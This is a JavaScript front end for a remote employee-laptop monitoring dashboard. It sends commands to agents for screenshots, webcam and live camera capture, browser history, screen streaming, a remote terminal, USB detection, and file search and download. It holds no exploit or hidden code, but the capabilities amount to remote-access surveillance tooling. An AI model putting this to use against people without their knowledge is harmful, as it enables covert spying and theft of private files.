// Dashboard logic: click a tool -> create a command -> poll for the result.

// ============================================================================
// DOM REFERENCES
// ============================================================================

const resultEl = document.getElementById("result");
const statusEl = document.getElementById("status");
const emailForm = document.getElementById("emailForm");
const streamToggleWrap = document.querySelector(".stream-toggle");
const streamLoop = document.getElementById("streamLoop");

// Tool 12 - File Transfer
const fileTransferForm = document.getElementById("fileTransferForm");
const filePathInput = document.getElementById("filePath");
const transferFileBtn = document.getElementById("transferFileBtn");
const fileSearchName = document.getElementById("fileSearchName");
const searchFileBtn = document.getElementById("searchFileBtn");
const fileSearchResults = document.getElementById("fileSearchResults");


// ============================================================================
// TOOL NAMES
// ============================================================================

const TOOL_NAMES = {
    1: "Screenshot",
    2: "CPU Info",
    3: "Camera",
    4: "Browser History",
    5: "Send Email",
    6: "Screen Stream",
    7: "USB Devices",
    8: "Live Camera",
    9: "Safe Terminal",
    12: "File Transfer",
};


// ============================================================================
// GLOBAL STATE
// ============================================================================

let streaming = false;
let selectedAgentId = null;

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));


function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, (c) =>
        ({
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#39;"
        }[c])
    );
}


function formatBytes(bytes) {
    if (!Number.isFinite(bytes) || bytes < 0) return "Unknown size";

    if (bytes === 0) return "0 Bytes";

    const units = [
        "Bytes",
        "KB",
        "MB",
        "GB",
        "TB"
    ];

    const i = Math.floor(Math.log(bytes) / Math.log(1024));

    return `${(bytes / Math.pow(1024, i)).toFixed(i === 0 ? 0 : 2)} ${units[i]}`;
}


function setStatus(text, cls = "") {
    statusEl.textContent = text;
    statusEl.className = "status" + (cls ? " " + cls : "");
}


function setButtonsDisabled(disabled) {
    document.querySelectorAll(".tool").forEach(
        (b) => (b.disabled = disabled)
    );
}


// ============================================================================
// EMPLOYEE LAPTOPS
// ============================================================================

async function loadDevices() {
    let data;

    try {
        data = await (await fetch("/api/agents")).json();
    } catch {
        return;
    }

    const list = data.agents || [];
    const box = document.getElementById("devices");

    // Online counter
    const countEl = document.getElementById("agentCount");

    if (countEl) {
        countEl.textContent = list.filter((a) => a.online).length;
    }

    if (!list.length) {
        box.innerHTML =
            '<div class="devices-empty">' +
            'No laptops connected yet. Start the agent on an employee machine.' +
            '</div>';

        selectedAgentId = null;

        const selectedName = document.getElementById("selectedName");

        if (selectedName) {
            selectedName.textContent = "— (no laptop selected)";
        }

        const dot = document.getElementById("targetDot");

        if (dot) {
            dot.classList.remove("online");
        }

        return;
    }

    // Auto-select first laptop
    if (
        !selectedAgentId ||
        !list.some((a) => a.id === selectedAgentId)
    ) {
        const first = list.find((a) => a.online) || list[0];
        selectAgent(first);
    }

    box.innerHTML = "";

    for (const a of list) {
        const card = document.createElement("div");

        card.className =
            "device" +
            (a.id === selectedAgentId ? " selected" : "");

        card.dataset.id = a.id;

        const status = a.online
            ? "online"
            : `offline · ${a.last_seen_secs}s ago`;

        card.innerHTML =
            `<span class="sdot ${a.online ? "online" : ""}"></span>` +
            `<span class="who">` +
                `<span class="u">${escapeHtml(a.username || "unknown")}</span>` +
                `<span class="h">${escapeHtml(a.hostname || a.id)}</span>` +
            `</span>` +
            `<span class="st">` +
                `${status}<br>` +
                `${escapeHtml(a.os || "")}` +
            `</span>`;

        card.addEventListener("click", () => {
            selectAgent(a);

            document.querySelectorAll(".device").forEach((el) =>
                el.classList.toggle(
                    "selected",
                    el.dataset.id === a.id
                )
            );
        });

        box.appendChild(card);
    }
}


function selectAgent(a) {
    selectedAgentId = a.id;

    const label =
        `${a.username || "unknown"} @ ${a.hostname || a.id}`;

    const selectedName = document.getElementById("selectedName");

    if (selectedName) {
        selectedName.textContent =
            label + (a.online ? "" : " (offline)");
    }

    const dot = document.getElementById("targetDot");

    if (dot) {
        dot.classList.toggle("online", !!a.online);
    }

    // Reset Tool 12 search results when changing laptop
    if (fileSearchResults) {
        fileSearchResults.innerHTML = "";
    }

    if (filePathInput) {
        filePathInput.value = "";
    }

    if (fileSearchName) {
        fileSearchName.value = "";
    }
}


// ============================================================================
// CREATE COMMAND + POLL RESULT
// ============================================================================

async function runTool(toolNo, payload = null) {
    if (!selectedAgentId) {
        setStatus("Select a laptop first", "err");
        return null;
    }

    setButtonsDisabled(true);

    setStatus(
        `Running ${TOOL_NAMES[toolNo]}…`,
        "busy"
    );

    try {
        const res = await fetch("/api/command", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                tool_no: toolNo,
                payload,
                agent_id: selectedAgentId
            }),
        });

        if (!res.ok) {
            let error = "Failed to queue command";

            try {
                const data = await res.json();
                error = data.error || error;
            } catch {}

            setStatus(error, "err");
            return null;
        }

        const { command_id } = await res.json();

        const result = await pollResult(command_id);

        return result;

    } catch (err) {
        console.error(err);
        setStatus(
            "Could not connect to server",
            "err"
        );
        return null;

    } finally {
        setButtonsDisabled(false);
    }
}


async function pollResult(
    commandId,
    {
        attempts = 80,
        interval = 300,
        shouldStop = null
    } = {}
) {
    for (let i = 0; i < attempts; i++) {

        if (shouldStop && shouldStop()) {
            return null;
        }

        try {
            const res = await fetch(
                `/api/result/${commandId}`
            );

            const data = await res.json();

            if (data.ready) {
                setStatus("Done", "ok");

                renderResult(data);

                return data;
            }

        } catch (err) {
            console.error("Polling error:", err);
        }

        await sleep(interval);
    }

    setStatus(
        "Timed out — is the agent running?",
        "err"
    );

    return null;
}


// ============================================================================
// NORMAL RESULT RENDERING
// ============================================================================

function renderResult(data) {
    resultEl.innerHTML = "";

    if (data.content_type === "image") {

        const img = document.createElement("img");

        img.src =
            data.data.startsWith("data:")
                ? data.data
                : "data:image/png;base64," + data.data;

        resultEl.appendChild(img);

    } else if (data.content_type === "json") {

        renderJson(data.data);

    } else {

        const pre = document.createElement("pre");

        pre.textContent = data.data;

        resultEl.appendChild(pre);
    }
}


function renderJson(raw) {
    let value;

    try {
        value =
            typeof raw === "string"
                ? JSON.parse(raw)
                : raw;

    } catch {

        const pre = document.createElement("pre");

        pre.textContent = raw;

        resultEl.appendChild(pre);

        return;
    }

    // Array of objects -> table
    if (
        Array.isArray(value) &&
        value.length &&
        typeof value[0] === "object"
    ) {
        resultEl.appendChild(
            buildTable(value)
        );

    } else {

        const pre = document.createElement("pre");

        pre.textContent =
            JSON.stringify(value, null, 2);

        resultEl.appendChild(pre);
    }
}


function buildTable(rows) {
    const cols = [
        ...new Set(
            rows.flatMap((r) =>
                Object.keys(r)
            )
        )
    ];

    const table = document.createElement("table");

    const thead = table.createTHead();

    const headerRow = thead.insertRow();

    cols.forEach((c) => {
        const th = document.createElement("th");

        th.textContent = c;

        headerRow.appendChild(th);
    });

    const tbody = table.createTBody();

    rows.forEach((r) => {

        const tr = tbody.insertRow();

        cols.forEach((c) => {

            tr.insertCell().textContent =
                r[c] ?? "";

        });
    });

    return table;
}


// ============================================================================
// TOOL BUTTON WIRING
// ============================================================================

document.querySelectorAll(".tool").forEach((btn) => {

    btn.addEventListener("click", async () => {

        const toolNo =
            Number(btn.dataset.tool);

        emailForm.hidden =
            toolNo !== 5;

        streamToggleWrap.hidden =
            toolNo !== 6;

        // Tool 12 visibility
        if (fileTransferForm) {
            fileTransferForm.hidden =
                toolNo !== 12;
        }

        if (toolNo === 5) {
            return;
        }

        if (toolNo === 6) {
            startStream();
            return;
        }

        if (toolNo === 8) {

            if (!selectedAgentId) {
                setStatus(
                    "Select a laptop first",
                    "err"
                );
                return;
            }

            window.open(
                `/live-camera?agent=${encodeURIComponent(selectedAgentId)}`,
                "_blank"
            );

            return;
        }

        if (toolNo === 9) {

            if (!selectedAgentId) {
                setStatus(
                    "Select a laptop first",
                    "err"
                );
                return;
            }

            window.open(
                `/terminal?agent=${encodeURIComponent(selectedAgentId)}`,
                "_blank"
            );

            return;
        }

        // Tool 12 uses its own UI
        if (toolNo === 12) {
            return;
        }

        await runTool(toolNo);
    });
});


// ============================================================================
// EMAIL FORM
// ============================================================================

document
    .getElementById("mailSend")
    .addEventListener("click", async () => {

        const payload = {
            to: document
                .getElementById("mailTo")
                .value
                .trim(),

            subject: document
                .getElementById("mailSubject")
                .value
                .trim(),

            body: document
                .getElementById("mailBody")
                .value,
        };

        if (!payload.to) {
            setStatus(
                "Enter a recipient",
                "err"
            );
            return;
        }

        emailForm.hidden = true;

        await runTool(5, payload);
    });


document
    .getElementById("mailCancel")
    .addEventListener("click", () => {

        emailForm.hidden = true;
    });


// ============================================================================
// TOOL 6 — SCREEN STREAM
// ============================================================================

async function startStream() {

    if (streaming) {

        streaming = false;

        setStatus(
            "Stream stopped",
            ""
        );

        return;
    }

    if (!selectedAgentId) {

        setStatus(
            "Select a laptop first",
            "err"
        );

        return;
    }

    streaming = true;

    setStatus(
        "Streaming…",
        "busy"
    );

    do {

        let commandId;

        try {

            const res = await fetch(
                "/api/command",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        tool_no: 6,
                        payload: null,
                        agent_id: selectedAgentId
                    }),
                }
            );

            if (!res.ok) {
                break;
            }

            commandId =
                (await res.json()).command_id;

        } catch {

            break;
        }

        const result =
            await pollResult(
                commandId,
                {
                    interval: 250,
                    shouldStop: () => !streaming
                }
            );

        if (!streaming) {
            break;
        }

        if (!result) {
            break;
        }

    } while (
        streamLoop &&
        streamLoop.checked
    );

    streaming = false;

    setStatus(
        "Stream stopped",
        ""
    );
}


// ============================================================================
// TOOL 12 — FILE TRANSFER
// ============================================================================
//
// Two modes:
//
// 1. Enter exact path:
//      C:\Users\User\Downloads\test.pdf
//
// 2. Search by filename:
//      test.pdf
//
// The Python agent returns:
//
// {
//     "filename": "...",
//     "size": 12345,
//     "mime": "...",
//     "data": "BASE64..."
// }
//
// BUT the agent sends this through json.dumps(), so the server's
// data.data is a JSON STRING. Therefore we must JSON.parse() it here.
// ============================================================================


// ----------------------------------------------------------------------------
// Send exact file path
// ----------------------------------------------------------------------------

async function transferFile(path) {

    if (!selectedAgentId) {

        setStatus(
            "Select a laptop first",
            "err"
        );

        return;
    }

    path = String(path || "").trim();

    if (!path) {

        setStatus(
            "Enter a file path",
            "err"
        );

        return;
    }

    setStatus(
        "Requesting file…",
        "busy"
    );

    transferFileBtn.disabled = true;
    searchFileBtn.disabled = true;

    try {

        const res = await fetch(
            "/api/command",
            {
                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json"
                },

                body: JSON.stringify({
                    tool_no: 12,

                    agent_id:
                        selectedAgentId,

                    payload: {
                        action: "download",
                        path: path
                    }
                }),
            }
        );

        const data = await res.json();

        if (!res.ok) {
            throw new Error(
                data.error ||
                "Failed to queue file transfer."
            );
        }

        await waitForFileResult(
            data.command_id
        );

    } catch (err) {

        console.error(
            "File transfer error:",
            err
        );

        setStatus(
            "File transfer failed",
            "err"
        );

        resultEl.innerHTML = "";

        const pre =
            document.createElement("pre");

        pre.textContent =
            err.message;

        resultEl.appendChild(pre);

    } finally {

        transferFileBtn.disabled = false;
        searchFileBtn.disabled = false;
    }
}


// ----------------------------------------------------------------------------
// Poll Tool 12 download result
// ----------------------------------------------------------------------------

async function waitForFileResult(commandId) {

    // Maximum roughly 40 seconds
    for (let i = 0; i < 80; i++) {

        try {

            const res =
                await fetch(
                    `/api/result/${commandId}`
                );

            const data =
                await res.json();

            if (!data.ready) {

                await sleep(500);

                continue;
            }

            if (data.content_type !== "json") {

                resultEl.innerHTML = "";

                const pre =
                    document.createElement("pre");

                pre.textContent =
                    String(data.data);

                resultEl.appendChild(pre);

                setStatus(
                    "Transfer failed",
                    "err"
                );

                return;
            }

            // IMPORTANT:
            // Python uses json.dumps(), therefore data.data
            // is normally a JSON string.
            let file;

            try {

                file =
                    typeof data.data === "string"
                        ? JSON.parse(data.data)
                        : data.data;

            } catch (err) {

                console.error(
                    "Invalid Tool 12 response:",
                    err
                );

                resultEl.innerHTML = "";

                const pre =
                    document.createElement("pre");

                pre.textContent =
                    "Invalid file response from agent.";

                resultEl.appendChild(pre);

                setStatus(
                    "Transfer failed",
                    "err"
                );

                return;
            }

            // Agent reported an error
            if (file.error) {

                resultEl.innerHTML = "";

                const pre =
                    document.createElement("pre");

                pre.textContent =
                    file.error;

                resultEl.appendChild(pre);

                setStatus(
                    "Transfer failed",
                    "err"
                );

                return;
            }

            // Validate required fields
            if (
                !file.filename ||
                !file.data
            ) {

                resultEl.innerHTML = "";

                const pre =
                    document.createElement("pre");

                pre.textContent =
                    "The agent returned an incomplete file.";

                resultEl.appendChild(pre);

                setStatus(
                    "Transfer failed",
                    "err"
                );

                return;
            }

            showDownloadFile(file);

            setStatus(
                "File ready",
                "ok"
            );

            return;

        } catch (err) {

            console.error(
                "Tool 12 polling error:",
                err
            );
        }

        await sleep(500);
    }

    setStatus(
        "File transfer timed out",
        "err"
    );
}


// ----------------------------------------------------------------------------
// Create browser download
// ----------------------------------------------------------------------------

function showDownloadFile(file) {

    resultEl.innerHTML = "";

    const wrapper =
        document.createElement("div");

    wrapper.className =
        "file-download-result";

    const title =
        document.createElement("h3");

    title.textContent =
        "File ready";

    wrapper.appendChild(title);


    // Filename
    const name =
        document.createElement("div");

    name.textContent =
        `Name: ${file.filename}`;

    wrapper.appendChild(name);


    // Size
    const size =
        document.createElement("div");

    size.textContent =
        `Size: ${formatBytes(Number(file.size))}`;

    wrapper.appendChild(size);


    // MIME
    if (file.mime) {

        const type =
            document.createElement("div");

        type.textContent =
            `Type: ${file.mime}`;

        wrapper.appendChild(type);
    }


    // Download button
    const download =
        document.createElement("a");

    download.textContent =
        "Download File";

    download.className =
        "download-file-btn";

    download.download =
        file.filename;


    // Create data URL from Base64
    const mime =
        file.mime ||
        "application/octet-stream";

    download.href =
        `data:${mime};base64,${file.data}`;


    download.target =
        "_blank";

    download.rel =
        "noopener";

    wrapper.appendChild(
        document.createElement("br")
    );

    wrapper.appendChild(download);

    resultEl.appendChild(wrapper);
}


// ----------------------------------------------------------------------------
// Search file by filename
// ----------------------------------------------------------------------------

async function searchFiles() {

    if (!selectedAgentId) {

        setStatus(
            "Select a laptop first",
            "err"
        );

        return;
    }

    const name =
        String(
            fileSearchName?.value || ""
        ).trim();

    if (!name) {

        setStatus(
            "Enter a filename",
            "err"
        );

        return;
    }

    setStatus(
        "Searching files…",
        "busy"
    );

    searchFileBtn.disabled = true;
    transferFileBtn.disabled = true;

    fileSearchResults.innerHTML =
        '<div class="file-search-loading">' +
        'Searching employee laptop…' +
        '</div>';

    try {

        const res =
            await fetch(
                "/api/command",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        tool_no: 12,

                        agent_id:
                            selectedAgentId,

                        payload: {
                            action: "search",
                            name: name
                        }
                    }),
                }
            );

        const data =
            await res.json();

        if (!res.ok) {

            throw new Error(
                data.error ||
                "Failed to start file search."
            );
        }

        await waitForSearchResult(
            data.command_id
        );

    } catch (err) {

        console.error(
            "File search error:",
            err
        );

        fileSearchResults.innerHTML =
            `<div class="file-search-error">` +
            `${escapeHtml(err.message)}` +
            `</div>`;

        setStatus(
            "File search failed",
            "err"
        );

    } finally {

        searchFileBtn.disabled = false;
        transferFileBtn.disabled = false;
    }
}


// ----------------------------------------------------------------------------
// Poll search result
// ----------------------------------------------------------------------------

async function waitForSearchResult(commandId) {

    // Maximum roughly 40 seconds
    for (let i = 0; i < 80; i++) {

        try {

            const res =
                await fetch(
                    `/api/result/${commandId}`
                );

            const data =
                await res.json();

            if (!data.ready) {

                await sleep(500);

                continue;
            }

            if (data.content_type !== "json") {

                fileSearchResults.innerHTML =
                    '<div class="file-search-error">' +
                    'Invalid response from agent.' +
                    '</div>';

                setStatus(
                    "File search failed",
                    "err"
                );

                return;
            }

            // IMPORTANT:
            // Python sends json.dumps(results)
            // so data.data is a JSON string.
            let files;

            try {

                files =
                    typeof data.data === "string"
                        ? JSON.parse(data.data)
                        : data.data;

            } catch (err) {

                console.error(
                    "Invalid search response:",
                    err
                );

                fileSearchResults.innerHTML =
                    '<div class="file-search-error">' +
                    'Invalid search response from agent.' +
                    '</div>';

                setStatus(
                    "File search failed",
                    "err"
                );

                return;
            }

            if (!Array.isArray(files)) {

                fileSearchResults.innerHTML =
                    '<div class="file-search-error">' +
                    'Unexpected search result.' +
                    '</div>';

                setStatus(
                    "File search failed",
                    "err"
                );

                return;
            }

            renderSearchResults(files);

            setStatus(
                `${files.length} file(s) found`,
                "ok"
            );

            return;

        } catch (err) {

            console.error(
                "Search polling error:",
                err
            );
        }

        await sleep(500);
    }

    fileSearchResults.innerHTML =
        '<div class="file-search-error">' +
        'File search timed out. Is the agent running?' +
        '</div>';

    setStatus(
        "File search timed out",
        "err"
    );
}


// ----------------------------------------------------------------------------
// Render search results
// ----------------------------------------------------------------------------

function renderSearchResults(files) {

    fileSearchResults.innerHTML = "";

    if (!files.length) {

        fileSearchResults.innerHTML =
            '<div class="file-search-empty">' +
            'No matching files found.' +
            '</div>';

        return;
    }

    const title =
        document.createElement("div");

    title.className =
        "file-search-title";

    title.textContent =
        `${files.length} matching file(s)`;

    fileSearchResults.appendChild(
        title
    );


    files.forEach((file) => {

        const card =
            document.createElement("div");

        card.className =
            "file-result-card";


        // File information
        const info =
            document.createElement("div");

        info.className =
            "file-result-info";


        const name =
            document.createElement("div");

        name.className =
            "file-result-name";

        name.textContent =
            file.name || "Unknown file";


        const size =
            document.createElement("div");

        size.className =
            "file-result-size";

        size.textContent =
            formatBytes(
                Number(file.size)
            );


        const path =
            document.createElement("div");

        path.className =
            "file-result-path";

        path.textContent =
            file.path || "";


        info.appendChild(name);
        info.appendChild(size);
        info.appendChild(path);


        // Transfer button
        const button =
            document.createElement("button");

        button.type =
            "button";

        button.className =
            "file-transfer-result-btn";

        button.textContent =
            "Transfer";


        button.addEventListener(
            "click",
            async () => {

                if (!file.path) {

                    setStatus(
                        "File path unavailable",
                        "err"
                    );

                    return;
                }

                // Put selected path into path field
                if (filePathInput) {
                    filePathInput.value =
                        file.path;
                }

                await transferFile(
                    file.path
                );
            }
        );


        card.appendChild(info);
        card.appendChild(button);

        fileSearchResults.appendChild(
            card
        );
    });
}


// ============================================================================
// TOOL 12 EVENT LISTENERS
// ============================================================================

// Transfer exact path
if (transferFileBtn) {

    transferFileBtn.addEventListener(
        "click",
        async () => {

            const path =
                filePathInput?.value || "";

            await transferFile(path);
        }
    );
}


// Search filename
if (searchFileBtn) {

    searchFileBtn.addEventListener(
        "click",
        async () => {

            await searchFiles();
        }
    );
}


// Press Enter in filename search
if (fileSearchName) {

    fileSearchName.addEventListener(
        "keydown",
        async (event) => {

            if (event.key === "Enter") {

                event.preventDefault();

                await searchFiles();
            }
        }
    );
}


// Press Enter in path field
if (filePathInput) {

    filePathInput.addEventListener(
        "keydown",
        async (event) => {

            if (event.key === "Enter") {

                event.preventDefault();

                await transferFile(
                    filePathInput.value
                );
            }
        }
    );
}


// ============================================================================
// USB AUTO-DETECTION
// ============================================================================

let usbKnown = null;
let usbAgentId = null;


function toast(text, kind = "info") {

    let box =
        document.getElementById(
            "toastBox"
        );

    if (!box) {

        box =
            document.createElement("div");

        box.id =
            "toastBox";

        box.style.cssText =
            "position:fixed;" +
            "top:16px;" +
            "right:16px;" +
            "z-index:9999;" +
            "display:flex;" +
            "flex-direction:column;" +
            "gap:8px;";

        document.body.appendChild(box);
    }

    const color =
        kind === "plug"
            ? "#2ecc71"
            : kind === "remove"
                ? "#e74c3c"
                : "#555";

    const t =
        document.createElement("div");

    t.style.cssText =
        `background:#1c1c1c;` +
        `color:#fff;` +
        `border-left:4px solid ${color};` +
        `padding:12px 16px;` +
        `border-radius:8px;` +
        `box-shadow:0 4px 14px rgba(0,0,0,.4);` +
        `font:14px system-ui;` +
        `min-width:220px;` +
        `max-width:340px;`;

    t.textContent =
        text;

    box.appendChild(t);

    setTimeout(() => {

        t.style.transition =
            "opacity .4s";

        t.style.opacity =
            "0";

        setTimeout(
            () => t.remove(),
            400
        );

    }, 6000);
}


// Ask agent for USB list
async function usbSnapshot() {

    if (!selectedAgentId) {
        return null;
    }

    try {

        const res =
            await fetch(
                "/api/command",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        tool_no: 7,
                        payload: null,
                        agent_id: selectedAgentId
                    }),
                }
            );

        if (!res.ok) {
            return null;
        }

        const { command_id } =
            await res.json();

        for (let i = 0; i < 15; i++) {

            const r =
                await (
                    await fetch(
                        `/api/result/${command_id}`
                    )
                ).json();

            if (r.ready) {

                if (
                    r.content_type === "json"
                ) {

                    try {
                        return JSON.parse(r.data);
                    } catch {
                        return [];
                    }
                }

                return [];
            }

            await sleep(300);
        }

    } catch (err) {

        console.error(
            "USB snapshot error:",
            err
        );
    }

    return null;
}


function renderUsbPanel(map) {

    const box =
        document.getElementById(
            "usbList"
        );

    if (!box) {
        return;
    }

    if (!map || map.size === 0) {

        box.innerHTML =
            '<div class="usb-empty">' +
            'No USB drives connected.' +
            '</div>';

        return;
    }

    box.innerHTML = "";

    for (const [drv, info] of map) {

        const card =
            document.createElement("div");

        card.className =
            "usb-card";

        const size =
            info.total_gb
                ? `${info.used_gb != null ? info.used_gb : 0} / ${info.total_gb} GB`
                : "removable drive";

        card.innerHTML =
            `<span class="usb-ico">🔌</span>` +
            `<span class="usb-meta">` +
                `<span class="usb-drv">${escapeHtml(drv)}</span>` +
                `<span class="usb-sub">` +
                    `${escapeHtml(info.filesystem || "USB")} · ` +
                    `${escapeHtml(size)}` +
                `</span>` +
            `</span>`;

        box.appendChild(card);
    }
}


// Background USB loop
async function usbAutoLoop() {

    while (true) {

        // Reset when selected laptop changes
        if (
            usbAgentId !== selectedAgentId
        ) {

            usbAgentId =
                selectedAgentId;

            usbKnown =
                null;

            renderUsbPanel(null);
        }


        // Don't scan during screen streaming
        if (
            selectedAgentId &&
            !streaming
        ) {

            const list =
                await usbSnapshot();

            if (
                list &&
                usbAgentId === selectedAgentId
            ) {

                const now =
                    new Map(
                        list.map(
                            (d) => [
                                d.drive,
                                d
                            ]
                        )
                    );


                // Skip first scan
                if (usbKnown !== null) {

                    // New USB
                    for (
                        const [drv, info]
                        of now
                    ) {

                        if (
                            !usbKnown.has(drv)
                        ) {

                            toast(
                                `🔌 USB connected: ${drv}` +
                                `${
                                    info.total_gb
                                        ? ` (${info.total_gb} GB)`
                                        : ""
                                }`,
                                "plug"
                            );
                        }
                    }


                    // Removed USB
                    for (
                        const [drv]
                        of usbKnown
                    ) {

                        if (
                            !now.has(drv)
                        ) {

                            toast(
                                `❌ USB removed: ${drv}`,
                                "remove"
                            );
                        }
                    }
                }

                usbKnown =
                    now;

                renderUsbPanel(now);

                const st =
                    document.getElementById(
                        "usbStatus"
                    );

                if (st) {

                    st.textContent =
                        `${now.size} connected · ` +
                        `${new Date().toLocaleTimeString()}`;
                }
            }
        }

        await sleep(3000);
    }
}


// ============================================================================
// HEADER ACTIONS
// ============================================================================

document
    .getElementById("clearBtn")
    .addEventListener(
        "click",
        async () => {

            try {

                const res =
                    await fetch(
                        "/api/commands/clear",
                        {
                            method: "POST"
                        }
                    );

                const data =
                    await res.json();

                setStatus(
                    `Cleared ${data.removed} queued command(s)`,
                    "ok"
                );

            } catch {

                setStatus(
                    "Failed to clear commands",
                    "err"
                );
            }
        }
    );


// ============================================================================
// INITIALIZATION
// ============================================================================

// Load employee laptops
loadDevices();

// Refresh laptop status
setInterval(
    loadDevices,
    4000
);

// Start USB detection
usbAutoLoop();